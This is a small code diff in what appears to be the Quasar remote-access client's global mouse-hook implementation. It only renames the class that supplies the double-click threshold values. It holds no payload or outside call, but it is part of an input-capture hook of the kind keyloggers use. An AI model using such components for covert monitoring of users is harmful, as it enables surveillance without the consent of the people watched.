@@ -22,8 +22,8 @@ namespace Quasar.Client.MouseKeyHook.Implementation
             : base(HookHelper.HookGlobalMouse)
         {
             m_SystemDoubleClickTime = ClientNatives.GetDoubleClickTime();
-            m_xDoubleClickThreshold = NativeMethods.GetXDoubleClickThreshold();
-            m_yDoubleClickThreshold = NativeMethods.GetYDoubleClickThreshold();
+            m_xDoubleClickThreshold = ClientNatives.GetXDoubleClickThreshold();
+            m_yDoubleClickThreshold = ClientNatives.GetYDoubleClickThreshold();
         }
 
         protected override void ProcessDown(ref MouseEventExtArgs e)
